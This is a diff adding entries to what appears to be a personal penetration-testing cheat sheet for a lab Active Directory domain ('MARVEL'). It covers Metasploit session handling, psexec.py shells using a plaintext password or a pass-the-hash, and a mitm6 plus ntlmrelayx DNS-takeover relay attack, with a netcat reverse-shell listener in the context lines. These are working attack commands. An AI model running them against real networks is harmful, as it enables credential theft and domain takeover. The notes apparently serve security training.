@@ -231,6 +231,12 @@ Set [[cheet#FoxyProxy]]
 
 to listen for the reverse shell -->  `nc -nvlp 7777`
 
+#### Pause and Enter in a Session
+when you have a shell for example:
+by typing `background` -->  you can go back to metasploit
+`sessions` -->  you can see the active sessions
+`sessions 1` -->  to go back into the session 1
+
 ------
 ### Active Directory
 #### Responder
@@ -261,6 +267,36 @@ Impacket’s ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP
 
 `ntlmrelayx.py -tf targets.txt -sm2support -c "whoami"
 `-c "command"` -->  execute a command
+
+#### psexec.py
+tools for obtaining an interactive shell on windows host
+`sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`        DOMAIN/user:'password'@ip
+
+can connect even with an hash:
+`sudo psexec.py administrator@172.16.214.130 -hashes hash`
+
+if psexec is not working:
+=> you can try to use:
+`wmiexec.py`
+`smbexec.py`
+
+#### mitm6
+mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server.
+
+first set up [[cheet#ntlmrelayx.py|ntlmrelayx.py]]:
+`ntlmrelayx.py -6 -t ldaps://172.16.214.128 -wh fakewpad.marvel.local -l lootme_folder`
+`-6` --> ipv6
+`-t` -->  target  (Domain Controller)
+`-wh` --> set up a fake wpad 
+`-l` -->  create a folder where it saves all the information found
+
+set up mitm6
+`sudo mitm6 -d marvel.local`
+`-d` -->  domain
+
+now we need an event occur in the network:
+for example -->      - reboot THEPUNISHER
+                - login inside THEPUNISHER as MARVEL\administrator 
 
 --------
 ## Sites
